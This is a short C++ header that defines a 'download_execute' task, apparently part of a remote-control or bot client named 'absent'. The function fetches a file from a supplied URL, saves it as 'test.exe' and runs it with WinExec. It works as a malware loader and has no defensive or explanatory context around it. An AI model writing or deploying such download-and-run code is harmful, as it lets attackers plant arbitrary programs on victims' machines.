#pragma once
#include "../comm/http.h"

namespace absent
{
	namespace tasks
	{
		bool download_execute(std::string url)
		{
			if (absent::http::downloadFile(url, "test.exe") == 0) { return false; }
			if (!WinExec("test.exe", 1)) { return false; }
			return true;
		}
	}
}